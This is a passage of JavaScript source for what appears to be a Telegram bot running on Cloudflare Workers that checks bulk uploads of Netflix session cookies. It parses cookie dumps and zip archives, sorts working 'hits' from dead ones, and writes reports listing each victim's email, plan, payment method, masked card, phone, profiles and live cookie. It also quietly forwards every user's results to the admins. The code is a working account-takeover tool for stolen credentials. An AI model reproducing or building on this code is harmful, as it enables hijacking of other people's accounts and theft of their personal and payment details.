    userGuid: decodeNetflixValue(growthAccount.ownerGuid || currentProfile.guid),
    showExtraMemberSection: featureTypes.includes("EXTRA_MEMBER") ? "Yes" : featureTypes.length ? "No" : null,
    membershipStatus: decodeNetflixValue(growthAccount.membershipStatus),
    localizedPlanName: decodeNetflixValue(currentPlan.name || nextPlan.name),
    planPrice: extractPriceValue(currentPlan) || extractPriceValue(nextPlan),
    paymentMethodType: decodeNetflixValue(paymentLogo || growthAccount.payer),
    maskedCard: null,
    phoneNumber: normalizePhoneNumber(phoneDigits, rawPhone.countryCode),
    videoQuality: decodeNetflixValue(currentPlan.videoQuality),
    holdStatus: firstBooleanLabel(
      holdMeta.isUserOnHold,
      holdMeta.holdStatus,
      holdMeta.isOnHold,
      holdMeta.pastDue,
      growthAccount.isUserOnHold,
      growthAccount.holdStatus,
      growthAccount.isOnHold,
      growthAccount.pastDue,
      growthAccount.isPastDue
    ),
    emailVerified: formatBooleanLabel(emailVerified),
    phoneVerified: formatBooleanLabel(rawPhone.isVerified),
    profiles: profileNames.join(", ") || null,
  };

  if (paymentTypename.includes("Card")) {
    info.paymentMethodType = "CC";
    if (paymentDisplayText) info.maskedCard = paymentDisplayText;
  } else if (paymentDisplayText && !paymentLogo) {
    info.paymentMethodType = info.paymentMethodType || paymentDisplayText;
  }

  return compactObject(info);
}

function extractNetflixCookieBundles(content) {
  let bestBundles = [];
  for (const extractor of [extractJsonCookieEntries, extractNetscapeCookieEntries, extractRawCookieEntries]) {
    const bundles = buildCookieBundlesFromEntries(extractor(content));
    if (bundles.length) {
      bestBundles = bundles;
      break;
    }
  }

  const splitBundles = extractBundlesFromSplitBlocks(content);
  if (splitBundles.length > bestBundles.length) return splitBundles;
  return bestBundles;
}

function extractBundlesFromSplitBlocks(content) {
  const candidates = [];
  const seen = new Set();
  for (const block of splitLikelyCookieBlocks(content)) {
    const trimmed = block.trim();
    if (!trimmed || !/NetflixId/i.test(trimmed)) continue;
    const key = trimmed.slice(0, 500);
    if (seen.has(key)) continue;
    seen.add(key);

    for (const extractor of [extractJsonCookieEntries, extractNetscapeCookieEntries, extractRawCookieEntries]) {
      const bundles = buildCookieBundlesFromEntries(extractor(trimmed));
      if (bundles.length) {
        candidates.push(...bundles);
        break;
      }
    }
  }

  return candidates.map((bundle, index) => ({
    ...bundle,
    index: index + 1,
    total: candidates.length,
  }));
}

function splitLikelyCookieBlocks(content) {
  const normalized = String(content || "").replace(/\r\n/g, "\n").replace(/\r/g, "\n");
  const blocks = [];

  const blankBlocks = normalized
    .split(/\n\s*\n+/)
    .map((block) => block.trim())
    .filter((block) => /NetflixId/i.test(block));
  if (blankBlocks.length > 1) blocks.push(...blankBlocks);

  const netflixLines = normalized
    .split("\n")
    .map((line) => line.trim())
    .filter((line) => /NetflixId/i.test(line));
  if (netflixLines.length > 1) blocks.push(...netflixLines);

  const netscapeBlocks = [];
  let current = [];
  let currentHasNetflixId = false;
  for (const line of normalized.split("\n")) {
    const trimmed = line.trim();
    if (!trimmed) continue;
    if (/\bNetflixId\b/i.test(trimmed) && currentHasNetflixId) {
      netscapeBlocks.push(current.join("\n"));
      current = [];
      currentHasNetflixId = false;
    }
    current.push(trimmed);
    if (/\bNetflixId\b/i.test(trimmed)) currentHasNetflixId = true;
  }
  if (currentHasNetflixId && current.length) netscapeBlocks.push(current.join("\n"));
  if (netscapeBlocks.length > 1) blocks.push(...netscapeBlocks);

  return blocks;
}

function extractJsonCookieEntries(content) {
  let data;
  try {
    data = JSON.parse(content);
  } catch {
    return [];
  }
  if (data && !Array.isArray(data)) {
    if (Array.isArray(data.cookies)) data = data.cookies;
    else if (Array.isArray(data.items)) data = data.items;
    else data = [data];
  }
  if (!Array.isArray(data)) return [];

  const entries = [];
  data.forEach((cookie, index) => {
    if (!cookie || typeof cookie !== "object") return;
    const domain = String(cookie.domain || "");
    const name = canonicalizeCookieName(cookie.name || "");
    if (!isNetflixCookieEntry(domain, name)) return;
    entries.push(buildCookieEntry(
      domain,
      domain.startsWith(".") ? "TRUE" : "FALSE",
      cookie.path || "/",
      cookie.secure ? "TRUE" : "FALSE",
      cookie.expirationDate || cookie.expiration || 0,
      name,
      cookie.value || "",
      index
    ));
  });
  return entries;
}

function extractNetscapeCookieEntries(rawText) {
  const entries = [];
  rawText.split(/\r?\n/).forEach((line, index) => {
    const parts = splitNetscapeCookieColumns(line);
    if (parts.length < 7) return;
    if (!/^(TRUE|FALSE)$/i.test(parts[1]) || !/^(TRUE|FALSE)$/i.test(parts[3])) return;
    if (!/^-?\d+(?:\.\d+)?$/.test(String(parts[4]).trim())) return;
    const domain = parts[0];
    const name = canonicalizeCookieName(parts[5]);
    if (!isNetflixCookieEntry(domain, name)) return;
    entries.push(buildCookieEntry(domain, parts[1], parts[2], parts[3], parts[4], name, parts[6], index));
  });
  return entries;
}

function extractRawCookieEntries(rawText) {
  const namePattern = COOKIE_NAMES.map(escapeRegExp).sort((a, b) => b.length - a.length).join("|");
  const regex = new RegExp(`(?:['"])?(?<name>${namePattern})(?:['"])?\\s*(?:=|:)\\s*(?<value>"[^"]*"|'[^']*'|[^;\\s]+)`, "gi");
  const entries = [];
  let match;
  let index = 0;
  while ((match = regex.exec(rawText))) {
    const cookieName = canonicalizeCookieName(match.groups.name);
    let value = match.groups.value || "";
    if (value.length >= 2 && value[0] === value[value.length - 1] && ["'", '"'].includes(value[0])) {
      value = value.slice(1, -1);
    } else {
      value = value.replace(/,+$/, "");
    }
    entries.push(buildCookieEntry(
      ".netflix.com",
      "TRUE",
      "/",
      cookieName === "SecureNetflixId" ? "TRUE" : "FALSE",
      "0",
      cookieName,
      value,
      index++
    ));
  }
  return entries;
}

function buildCookieBundlesFromEntries(entries) {
  if (!entries.length) return [];
  const entriesByName = new Map();
  for (const entry of entries) {
    if (!entry.name) continue;
    if (!entriesByName.has(entry.name)) entriesByName.set(entry.name, []);
    entriesByName.get(entry.name).push(entry);
  }
  if (!entriesByName.size) return [];

  const netflixIds = entriesByName.get("NetflixId") || [];
  const bundleCount = netflixIds.length || Math.max(...[...entriesByName.values()].map((items) => items.length));
  const bundles = [];
  for (let bundleIndex = 0; bundleIndex < bundleCount; bundleIndex++) {
    const selected = [];
    for (const nameEntries of entriesByName.values()) {
      if (bundleIndex < nameEntries.length) selected.push(nameEntries[bundleIndex]);
      else if (nameEntries.length === 1) selected.push(nameEntries[0]);
    }
    selected.sort((a, b) => a.position - b.position);
    const netscapeText = selected.map(formatNetscapeCookieEntry).join("\n");
    bundles.push({
      index: bundleIndex + 1,
      total: bundleCount,
      netscapeText,
      cookies: cookiesDictFromNetscape(netscapeText),
    });
  }
  return bundles;
}

function buildCookieEntry(domain, tailMatch, path, secure, expires, name, value, position) {
  return {
    domain: String(domain || "").replace(/^#HttpOnly_/, ""),
    tailMatch: String(tailMatch).toUpperCase() === "TRUE" ? "TRUE" : "FALSE",
    path: String(path || "/"),
    secure: String(secure).toUpperCase() === "TRUE" ? "TRUE" : "FALSE",
    expires: String(expires || 0).replace(/\.0+$/, "") || "0",
    name: canonicalizeCookieName(name),
    value: String(value || ""),
    position,
  };
}

function formatNetscapeCookieEntry(entry) {
  return `${entry.domain}\t${entry.tailMatch}\t${entry.path}\t${entry.secure}\t${entry.expires}\t${entry.name}\t${entry.value}`;
}

function cookiesDictFromNetscape(netscapeText) {
  const cookies = {};
  for (const line of netscapeText.split(/\r?\n/)) {
    const parts = splitNetscapeCookieColumns(line);
    if (parts.length >= 7) {
      const domain = parts[0];
      const name = canonicalizeCookieName(parts[5]);
      if (isNetflixCookieEntry(domain, name)) cookies[name] = parts[6];
    }
  }
  return cookies;
}

function splitNetscapeCookieColumns(line) {
  let stripped = String(line || "").trim();
  if (!stripped) return [];
  if (stripped.startsWith("#") && !stripped.startsWith("#HttpOnly_")) return [];
  stripped = stripped.replace(/^#HttpOnly_/, "");
  let parts = stripped.split("\t");
  if (parts.length >= 7) return [...parts.slice(0, 6), parts.slice(6).join("\t")];
  parts = stripped.split(/\s+/, 7);
  return parts.length >= 7 ? parts : [];
}

function hasRequiredCookies(cookies) {
  return REQUIRED_COOKIES.every((name) => decodeNetflixValue(cookies[name]));
}

function isNetflixCookieEntry(domain, name) {
  return COOKIE_NAMES.includes(canonicalizeCookieName(name)) || isNetflixDomain(domain);
}

function isNetflixDomain(domain) {
  return String(domain || "").replace(/^#HttpOnly_/, "").toLowerCase().includes("netflix.");
}

function canonicalizeCookieName(name) {
  const normalized = String(name || "").trim();
  return CANONICAL_COOKIE_NAMES.get(normalized.toLowerCase()) || normalized;
}

async function importUpload(filename, bytes, env) {
  const extension = getExtension(filename);
  if (extension === ".7z" || extension === ".rar") {
    throw new Error(".7z/.rar need Cloudflare Containers or an external unpacker. This deployed Worker supports pasted text, .txt, .json, and .zip.");
  }
  if (SUPPORTED_COOKIE_EXTENSIONS.has(extension)) {
    return expandUploadedTextFile(filename, decodeBytes(bytes));
  }
  if (extension === ".zip") {
    const files = [];
    const maxArchiveFiles = Number(env.MAX_ARCHIVE_FILES || 1000);
    const unzipped = unzipSync(new Uint8Array(bytes));
    for (const [entryName, entryBytes] of Object.entries(unzipped)) {
      const safeName = sanitizeFilename(entryName);
      if (!SUPPORTED_COOKIE_EXTENSIONS.has(getExtension(safeName))) continue;
      files.push(...expandUploadedTextFile(safeName, decodeBytes(entryBytes)));
      if (files.length > maxArchiveFiles) throw new Error(`Archive contains more than ${maxArchiveFiles} cookie files.`);
    }
    return files;
  }
  throw new Error("Unsupported file type.");
}

function expandUploadedTextFile(filename, text) {
  const extension = getExtension(filename);
  if (extension !== ".txt") {
    return [{ name: filename, text }];
  }

  const bundles = extractNetflixCookieBundles(text);
  if (bundles.length > 1) {
    return [{ name: filename, text }];
  }

  const blocks = splitLikelyCookieBlocks(text)
    .map((block) => block.trim())
    .filter((block) => block && /NetflixId/i.test(block));

  if (blocks.length <= 1) {
    return [{ name: filename, text }];
  }

  return blocks.map((block, index) => ({
    name: buildVirtualPartFilename(filename, index + 1, blocks.length),
    text: `${block}\n`,
  }));
}

function buildVirtualPartFilename(filename, index, total) {
  const safe = sanitizeFilename(filename);
  const extension = getExtension(safe) || ".txt";
  const base = safe.slice(0, safe.length - extension.length) || "cookie";
  return `${base}__part_${index}_of_${total}${extension}`;
}

async function downloadTelegramFile(env, fileId) {
  const fileInfo = await telegramApi(env, "getFile", { file_id: fileId });
  if (!fileInfo.ok || !fileInfo.result || !fileInfo.result.file_path) {
    throw new Error(fileInfo.description || "Telegram could not return the file path.");
  }
  const response = await fetch(`https://api.telegram.org/file/bot${env.BOT_TOKEN}/${fileInfo.result.file_path}`);
  if (!response.ok) throw new Error(`Telegram file download failed: HTTP ${response.status}`);
  return await response.arrayBuffer();
}

async function sendTerminalPreview(env, chatId, output) {
  const escaped = escapeHtml(output);
  if (escaped.length <= TELEGRAM_LIMIT - 20) {
    await sendMessage(env, chatId, `<pre>${escaped}</pre>`, "HTML");
    return;
  }
  const preview = output.slice(-PREVIEW_LIMIT);
  await sendMessage(env, chatId, `<pre>${escapeHtml(preview)}</pre>\nFull output is attached.`, "HTML");
}

async function sendMessage(env, chatId, text, parseMode = undefined, options = undefined) {
  const payload = {
    chat_id: chatId,
    text,
    disable_web_page_preview: true,
  };
  let finalOptions = options || {};
  if (parseMode && typeof parseMode === "object") {
    finalOptions = parseMode;
    parseMode = undefined;
  }
  if (parseMode) payload.parse_mode = parseMode;
  if (finalOptions.replyMarkup) payload.reply_markup = finalOptions.replyMarkup;
  return telegramApi(env, "sendMessage", payload);
}

async function sendOrEditMessage(env, chatId, messageId, text, parseMode = undefined) {
  if (messageId) {
    return editMessageText(env, chatId, messageId, text, parseMode);
  }
  return sendMessage(env, chatId, text, parseMode);
}

async function answerCallbackQuery(env, callbackQueryId, text = undefined, showAlert = false) {
  const payload = { callback_query_id: callbackQueryId };
  if (text) payload.text = String(text).slice(0, 190);
  if (showAlert) payload.show_alert = true;
  return telegramApi(env, "answerCallbackQuery", payload);
}

async function sendLongMessage(env, chatId, text) {
  const chunks = splitTelegramText(text, TELEGRAM_LIMIT);
  for (const chunk of chunks) {
    await sendMessage(env, chatId, chunk);
  }
}

function splitTelegramText(text, limit) {
  const value = String(text || "");
  if (value.length <= limit) return [value];

  const chunks = [];
  let remaining = value;
  while (remaining.length > limit) {
    let splitAt = remaining.lastIndexOf("\n", limit);
    if (splitAt < Math.floor(limit * 0.5)) {
      splitAt = remaining.lastIndexOf(" ", limit);
    }
    if (splitAt < Math.floor(limit * 0.5)) {
      splitAt = limit;
    }
    chunks.push(remaining.slice(0, splitAt).trimEnd());
    remaining = remaining.slice(splitAt).trimStart();
  }
  if (remaining) chunks.push(remaining);
  return chunks;
}

function createProgressReporter(env, chatId, messageId) {
  let lastEditAt = 0;
  let lastText = "";
  return async (terminalOutput, force = false) => {
    if (!messageId) return;
    const now = Date.now();
    const interval = Number(env.PROGRESS_EDIT_INTERVAL_MS || 1800);
    if (!force && now - lastEditAt < interval) return;

    const preview = formatTelegramProgressPreview(terminalOutput);
    if (preview === lastText) return;
    lastEditAt = now;
    lastText = preview;

    try {
      await editMessageText(env, chatId, messageId, `<pre>${escapeHtml(preview)}</pre>`, "HTML");
    } catch (error) {
      const message = String(error?.message || "");
      if (!message.includes("message is not modified")) {
        console.error("Could not edit progress message", error);
      }
    }
  };
}

function formatTelegramProgressPreview(output) {
  if (output.length <= PREVIEW_LIMIT) return output;
  return output.slice(-PREVIEW_LIMIT);
}

async function editMessageText(env, chatId, messageId, text, parseMode = undefined) {
  const payload = {
    chat_id: chatId,
    message_id: messageId,
    text,
    disable_web_page_preview: true,
  };
  if (parseMode) payload.parse_mode = parseMode;
  return telegramApi(env, "editMessageText", payload);
}

async function sendDocument(env, chatId, filename, content, caption) {
  const form = new FormData();
  form.append("chat_id", String(chatId));
  if (caption) form.append("caption", caption);
  form.append("document", new Blob([content], { type: "text/plain;charset=utf-8" }), filename);
  const response = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendDocument`, {
    method: "POST",
    body: form,
  });
  return response.json();
}

async function sendAdminResultCopies(env, sourceChatId, report, filename) {
  const adminIds = getConfiguredAdminIds(env).filter((adminId) => String(adminId) !== String(sourceChatId));
  for (const adminId of adminIds) {
    try {
      await sendDocument(env, adminId, filename || DEFAULT_REPORT_FILENAME, report, `Admin copy from account ${sourceChatId}.`);
    } catch (error) {
      console.error(`Could not send admin copy to ${adminId}`, error);
    }
  }
}

async function ensureBotCommands(env) {
  const now = Date.now();
  if (botCommandSyncPromise) {
    return botCommandSyncPromise;
  }
  if (now - lastBotCommandSyncAt < COMMAND_SYNC_INTERVAL_MS) {
    return;
  }

  botCommandSyncPromise = syncBotCommands(env)
    .then(() => {
      lastBotCommandSyncAt = Date.now();
    })
    .finally(() => {
      botCommandSyncPromise = null;
    });
  return botCommandSyncPromise;
}

async function syncBotCommands(env) {
  const publicCommands = [
    { command: "start", description: "Start" },
    { command: "check", description: "Check cookies" },
  ];
  const adminCommands = [
    ...publicCommands,
    { command: "add", description: "Add approved user" },
    { command: "remove", description: "Remove approved user" },
    { command: "list", description: "List approved users" },
    { command: "status", description: "Check user access" },
  ];

  await telegramApi(env, "setMyCommands", {
    scope: { type: "all_private_chats" },
    commands: publicCommands,
  });
  await telegramApi(env, "setChatMenuButton", {
    menu_button: { type: "commands" },
  });

  for (const adminId of getConfiguredAdminIds(env)) {
    await telegramApi(env, "setMyCommands", {
      scope: { type: "chat", chat_id: Number(adminId) || adminId },
      commands: adminCommands,
    });
    await telegramApi(env, "setChatMenuButton", {
      chat_id: Number(adminId) || adminId,
      menu_button: { type: "commands" },
    });
  }
}

async function telegramApi(env, method, payload) {
  const response = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/${method}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(payload),
  });
  const data = await response.json();
  if (!response.ok || data.ok === false) {
    throw new Error(data.description || `Telegram ${method} failed with HTTP ${response.status}`);
  }
  return data;
}

async function notifyUpdateError(update, env, error) {
  console.error(error);
  const message = update.message || update.edited_message || update.channel_post;
  const chatId = message?.chat?.id;
  if (!chatId) return;
  try {
    await sendMessage(env, chatId, `Checker failed on Cloudflare: ${error.message || String(error)}`);
  } catch (sendError) {
    console.error(sendError);
  }
}

export class JobState {
  constructor(state, env) {
    this.state = state;
    this.storage = state.storage;
    this.env = env;
  }

  async fetch(request) {
    const url = new URL(request.url);
    const body = request.method === "POST" ? await request.json() : {};

    if (url.pathname === "/init") {
      return jsonResponse(await this.init(body));
    }
    if (url.pathname === "/record") {
      return jsonResponse(await this.record(body));
    }
    if (url.pathname === "/status") {
      return jsonResponse(await this.getStatus());
    }
    return new Response("Not found", { status: 404 });
  }

  async init(body) {
    const meta = {
      jobId: body.jobId,
      chatId: body.chatId,
      messageId: body.messageId,
      sourceFiles: Array.isArray(body.sourceFiles) ? body.sourceFiles : [],
      reportFilename: sanitizeFilename(body.reportFilename || DEFAULT_REPORT_FILENAME),
      total: Number(body.total || 0),
      processed: 0,
      counts: { ...DEFAULT_COUNTS },
      planCounts: {},
      planLabels: {},
      lastNotificationProcessed: 0,
      completed: false,
      reportQueued: false,
    };
    await this.storage.put("meta", meta);
    return {
      ok: true,
      progressText: "Starting...",
    };
  }

  async record(body) {
    const meta = await this.storage.get("meta");
    if (!meta) {
      return { ok: false, error: "Job not initialized" };
    }

    let {
      resultType,
      reason,
      country,
      planName,
      planKey,
      onHold,
      duplicateKey,
      info,
      netscapeContent,
      nftokenData,
    } = body;

    const label = body.label || body.fileName || "cookie.txt";

    if (duplicateKey && (resultType === "success" || resultType === "free")) {
      const seenStorageKey = `seen:${duplicateKey}`;
      if (await this.storage.get(seenStorageKey)) {
        resultType = "duplicate";
      } else {
        await this.storage.put(seenStorageKey, 1);
      }
    }

    if (resultType === "success") {
      meta.counts.hits += 1;
      if (onHold) meta.counts.on_hold += 1;
      if (planKey) meta.planCounts[planKey] = (meta.planCounts[planKey] || 0) + 1;
      if (planKey && planName) meta.planLabels[planKey] = planName;
      await this.storage.put(`result:${String(body.taskIndex).padStart(6, "0")}`, {
        info: info || {},
        netscapeContent: netscapeContent || "",
        nftokenData: nftokenData || {},
      });
    } else if (resultType === "free") {
      meta.counts.free += 1;
      if (planKey) meta.planCounts[planKey] = (meta.planCounts[planKey] || 0) + 1;
      if (planKey && planName) meta.planLabels[planKey] = planName;
    } else if (resultType === "failed") {
      meta.counts.bad += 1;
    } else if (resultType === "duplicate") {
      meta.counts.duplicate += 1;
    } else {
      meta.counts.errors += 1;
    }

    meta.processed += 1;
    meta.completed = meta.processed >= meta.total;

    const notifyEvery = Math.max(1, Number(this.env.PROGRESS_NOTIFY_EVERY || 1));
    const shouldNotify = meta.completed || meta.processed <= 3 || (meta.processed - meta.lastNotificationProcessed) >= notifyEvery;
    if (shouldNotify) {
      meta.lastNotificationProcessed = meta.processed;
    }

    let report = null;
    let shouldSendReport = false;
    if (meta.completed && !meta.reportQueued) {
      meta.reportQueued = true;
      shouldSendReport = true;
      report = await this.buildReport(meta);
    }

    await this.storage.put("meta", meta);

    return {
      ok: true,
      chatId: meta.chatId,
      messageId: meta.messageId,
      progressText: buildProgressLine({
        counts: meta.counts,
        checked: meta.total,
        processed: meta.processed,
      }),
      shouldNotify,
      completed: shouldSendReport,
      report,
      reportFilename: meta.reportFilename,
      line: formatStatus(resultType, label, country, planName, reason),
    };
  }

  async buildReport(meta) {
    const resultsMap = await this.storage.list({ prefix: "result:" });
    const resultEntries = Array.from(resultsMap.keys())
      .sort()
      .map((key) => resultsMap.get(key));
    return buildCombinedResultsReport(resultEntries, meta.sourceFiles || [], meta.total || 0, this.env);
  }

  async getStatus() {
    return (await this.storage.get("meta")) || null;
  }
}

export class AccessControl {
  constructor(state, env) {
    this.state = state;
    this.storage = state.storage;
    this.env = env;
  }

  async fetch(request) {
    const url = new URL(request.url);
    const body = request.method === "POST" ? await request.json() : {};

    if (url.pathname === "/check") {
      return jsonResponse(await this.check(body));
    }
    if (url.pathname === "/arm-scan") {
      return jsonResponse(await this.armScan(body));
    }
    if (url.pathname === "/consume-scan") {
      return jsonResponse(await this.consumeScan(body));
    }
    if (url.pathname === "/record-free-scan") {
      return jsonResponse(await this.recordFreeScan(body));
    }
    if (url.pathname === "/allow") {
      return jsonResponse(await this.allow(body));
    }
    if (url.pathname === "/revoke") {
      return jsonResponse(await this.revoke(body));
    }
    if (url.pathname === "/list") {
      return jsonResponse(await this.list(body));
    }
    return new Response("Not found", { status: 404 });
  }

  getAdminIds() {
    const raw = String(this.env.ADMIN_CHAT_IDS || this.env.PRIMARY_ADMIN_ID || DEFAULT_ADMIN_CHAT_IDS.join(","));
    const adminIds = raw
      .split(",")
      .map((item) => normalizeId(item))
      .filter(Boolean);
    return [...new Set(adminIds)];
  }

  getStaticAllowedIds() {
    const raw = String(this.env.ALLOWED_CHAT_IDS || "");
    return raw
      .split(",")
      .map((item) => normalizeId(item))
      .filter(Boolean);
  }

  getFreeLimits() {
    return getFreeScanLimits(this.env);
  }

  async getFreeScanUsage(chatId, now = Date.now(), limits = this.getFreeLimits()) {
    const key = `free:${chatId}`;
    const state = (await this.storage.get(key)) || {};
    const day = getFreeLimitDayKey(now, limits.timeZone);
    const count = state.day === day ? Number(state.count || 0) : 0;
    const lastScanAt = Number(state.lastScanAt || 0);
    const cooldownRemainingMs = lastScanAt ? Math.max(0, limits.cooldownMs - (now - lastScanAt)) : 0;
    return {
      day,
      count,
      remainingToday: Math.max(0, limits.dailyLimit - count),
      lastScanAt,
      cooldownRemainingMs,
    };
  }

  async getFreeScanAvailability(chatId, now = Date.now(), limits = this.getFreeLimits()) {
    const usage = await this.getFreeScanUsage(chatId, now, limits);
    if (usage.remainingToday <= 0 || usage.cooldownRemainingMs > 0) {
      return {
        ok: false,
        error: buildFreeTierBlockedMessage(limits, usage, this.env.OWNER_USERNAME),
        freeLimits: limits,
        freeUsage: usage,
      };
    }
    return { ok: true, freeLimits: limits, freeUsage: usage };
  }

  async check(body) {
    const actorId = normalizeId(body.actorId);
    const targetId = normalizeId(body.targetId || body.chatId);
    const adminIds = this.getAdminIds();
    const staticAllowedIds = this.getStaticAllowedIds();
    const record = targetId ? await this.storage.get(`allow:${targetId}`) : null;
    const isAdminActor = actorId ? adminIds.includes(actorId) : false;
    const allowed = Boolean(
      (targetId && (adminIds.includes(targetId) || staticAllowedIds.includes(targetId) || record)) || isAdminActor
    );

    const freeLimits = this.getFreeLimits();
    const freeUsage = !allowed && targetId ? await this.getFreeScanUsage(targetId, Date.now(), freeLimits) : null;

    return {
      ok: true,
      actorId,
      chatId: targetId,
      allowed,
      isAdminActor,
      adminIds,
      freeLimits,
      freeUsage,
      ownerUsername: String(this.env.OWNER_USERNAME || DEFAULT_OWNER_USERNAME),
      record: record || null,
    };
  }

  async allow(body) {
    const actorId = normalizeId(body.actorId);
    const targetId = normalizeId(body.targetId);
    const name = sanitizeUserLabel(body.name);
    const username = normalizeTelegramUsername(body.username);
    if (!this.getAdminIds().includes(actorId)) {
      return { ok: false, error: "Only the admin can add VIP users." };
    }
    if (!targetId) {
      return { ok: false, error: "Missing account ID." };
    }

    await Promise.all([
      this.storage.put(`allow:${targetId}`, {
        chatId: targetId,
        name,
        username,
        addedBy: actorId,
        addedAt: formatUtcDate(new Date()),
      }),
      this.storage.delete(`scan:${targetId}`),
      this.storage.delete(`free:${targetId}`),
    ]);
    return { ok: true };
  }

  async revoke(body) {
    const actorId = normalizeId(body.actorId);
    const targetId = normalizeId(body.targetId);
    if (!this.getAdminIds().includes(actorId)) {
      return { ok: false, error: "Only the admin can remove VIP users." };
    }
    if (!targetId) {
      return { ok: false, error: "Missing account ID." };
    }
    if (this.getAdminIds().includes(targetId)) {
      return { ok: false, error: "Admin access cannot be removed here." };
    }

    await Promise.all([
      this.storage.delete(`allow:${targetId}`),
      this.storage.delete(`scan:${targetId}`),
      this.storage.delete(`free:${targetId}`),
    ]);
    return { ok: true };
  }

  async list(body) {
    const actorId = normalizeId(body.actorId);
    if (!this.getAdminIds().includes(actorId)) {
      return { ok: false, error: "Only the admin can view the VIP list." };
    }

    const results = await this.storage.list({ prefix: "allow:" });
    const allowedUsers = Array.from(results.values())
      .map((item) => item || {})
      .sort((left, right) => String(left.chatId || "").localeCompare(String(right.chatId || "")));

    return {
      ok: true,
      adminIds: this.getAdminIds(),
      allowedUsers,
    };
  }

  async armScan(body) {
    const access = await this.check(body);
    if (!access.ok || !access.chatId) {
      return { ok: false, error: "Could not identify this account." };
    }

    let freeUsage = access.freeUsage;
    if (!access.allowed) {
      const availability = await this.getFreeScanAvailability(access.chatId, Date.now(), access.freeLimits);
      if (!availability.ok) return availability;
      freeUsage = availability.freeUsage;
    }

    await this.storage.put(`scan:${access.chatId}`, {
      chatId: access.chatId,
      armedAt: Date.now(),
      armedBy: access.actorId || access.chatId,
    });
    return {
      ok: true,
      allowed: access.allowed,
      actorId: access.actorId,
      chatId: access.chatId,
      freeLimits: access.freeLimits,
      freeUsage,
    };
  }

  async consumeScan(body) {
    const access = await this.check(body);
    if (!access.ok || !access.chatId) {
      return { ok: true, armed: false };
    }

    const key = `scan:${access.chatId}`;
    const state = await this.storage.get(key);
    if (!state) {
      return { ok: true, armed: false };
    }

    if (Date.now() - Number(state.armedAt || 0) > SCAN_STATE_TTL_MS) {
      await this.storage.delete(key);
      return { ok: true, armed: false, expired: true };
    }

    await this.storage.delete(key);
    return {
      ok: true,
      armed: true,
      allowed: access.allowed,
      actorId: access.actorId,
      chatId: access.chatId,
      freeLimits: access.freeLimits,
      freeUsage: access.freeUsage,
    };
  }

  async recordFreeScan(body) {
    const access = await this.check(body);
    if (!access.ok || !access.chatId) {
      return { ok: false, error: "Could not identify this account." };
    }
    if (access.allowed) {
      return { ok: true, skipped: true };
    }

    const limits = access.freeLimits;
    const cookieCount = Number(body.cookieCount || 0);
    if (cookieCount > limits.maxCookies) {
      return {
        ok: false,
        error: `Free users can scan up to ${limits.maxCookies} cookies at a time.`,
        freeLimits: limits,
        freeUsage: access.freeUsage,
      };
    }

    const now = Date.now();
    const availability = await this.getFreeScanAvailability(access.chatId, now, limits);
    if (!availability.ok) return availability;

    const nextUsage = {
      day: availability.freeUsage.day,
      count: availability.freeUsage.count + 1,
      lastScanAt: now,
    };
    await this.storage.put(`free:${access.chatId}`, nextUsage);

    return {
      ok: true,
      freeLimits: limits,
      freeUsage: {
        ...nextUsage,
        remainingToday: Math.max(0, limits.dailyLimit - nextUsage.count),
        cooldownRemainingMs: limits.cooldownMs,
      },
    };
  }
}

async function getAccessStatus(env, chatId, actorId) {
  return accessRequest(env, "/check", { chatId, actorId, targetId: chatId });
}

function getAccessStub(env) {
  const id = env.ACCESS_CONTROL.idFromName("vip-access");
  return env.ACCESS_CONTROL.get(id);
}

async function accessRequest(env, path, body) {
  const response = await getAccessStub(env).fetch(`https://access${path}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body || {}),
  });
  if (!response.ok) {
    throw new Error(`Access control request failed with HTTP ${response.status}`);
  }
  return response.json();
}

function getJobStub(env, jobId) {
  const id = env.JOB_STATE.idFromName(jobId);
  return env.JOB_STATE.get(id);
}

async function jobRequest(stub, path, body) {
  const response = await stub.fetch(`https://job${path}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body || {}),
  });
  if (!response.ok) {
    throw new Error(`Job coordinator request failed with HTTP ${response.status}`);
  }
  return response.json();
}

function chunkArray(items, size) {
  const chunks = [];
  for (let index = 0; index < items.length; index += size) {
    chunks.push(items.slice(index, index + size));
  }
  return chunks;
}

function jsonResponse(value) {
  return new Response(JSON.stringify(value), {
    headers: { "content-type": "application/json; charset=utf-8" },
  });
}

function buildCombinedResultsReport(resultEntries, sourceFiles, totalChecked, env = {}) {
  const generated = formatTimestamp(new Date());
  const lines = [
    "Netflix Token Results",
    REPORT_SEPARATOR,
    `Generated: ${generated}`,
    `Source: ${formatReportSource(sourceFiles)}`,
    `Scanned by : ${getScannerHandle(env)}`,
    `Total Checked: ${totalChecked}`,
    `Hits: ${resultEntries.length}`,
    REPORT_SEPARATOR,
    "",
  ];

  resultEntries.forEach((entry, index) => {
    lines.push(buildCombinedResultSection(index + 1, entry, generated));
  });
  return lines.join("\n").trimEnd() + "\n";
}

function buildCombinedResultSection(hitNumber, resultEntry, generated) {
  const info = resultEntry.info || {};
  const plan = derivePlanInfo(info, true);
  const details = [
    ["Email", normalizeOutputValue(info.email)],
    ["Country", normalizeOutputValue(info.countryOfSignup)],
    ["Plan", normalizeOutputValue(plan.planName)],
    ["Price", normalizeOutputValue(info.planPrice, "Unknown")],
    ["Member Since", normalizeOutputValue(info.memberSince)],
    ["Next Billing", normalizeOutputValue(info.nextBillingDate, "Unknown")],
    ["Payment", normalizeOutputValue(info.paymentMethodType, "Unknown", true)],
    ["Phone", normalizeOutputValue(info.phoneDisplay)],
    ["Quality", normalizeOutputValue(info.videoQuality, "Unknown")],
    ["Streams", normalizeOutputValue(String(info.maxStreams || "").replace(/}$/, ""), "Unknown")],
    ["Hold Status", normalizeOutputValue(info.holdStatus, "Unknown")],
    ["Extra Member", normalizeOutputValue(info.showExtraMemberSection, "Unknown")],
    ["Profiles", normalizeOutputValue(info.profilesDisplay, "Unknown")],
    ["Cookie", formatReportCookieValue(resultEntry.netscapeContent || "")],
  ];
  const lines = [
    `${"=".repeat(HIT_SEPARATOR_WIDTH)} HIT #${hitNumber} ${"=".repeat(HIT_SEPARATOR_WIDTH)}`,
    `Generated: ${generated}`,
    `Expires:   ${formatReportExpiry((resultEntry.nftokenData || {}).expires_at_utc)}`,
